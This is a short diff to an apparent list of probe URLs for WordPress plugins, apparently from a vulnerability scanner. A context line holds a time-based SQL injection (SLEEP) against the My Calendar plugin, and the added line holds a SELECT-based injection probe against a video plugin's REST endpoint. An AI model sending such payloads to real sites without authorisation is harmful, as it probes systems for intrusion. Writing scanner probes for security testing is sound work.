@@ -60,3 +60,4 @@
 /wp-content/plugins/my-calendar/readme.txt
 /?to=2026-09-12&from=2026-08-13&mc-api=json
 /?to=2026-09-12&from=2026-08-13&mc-api=json&mc_auth=1%2C2)%20OR%20SLEEP%287%29--%20x
+/wp-json/vsfw/v1/videos?fields=%28SELECT%20424242*2%29%20as%20id
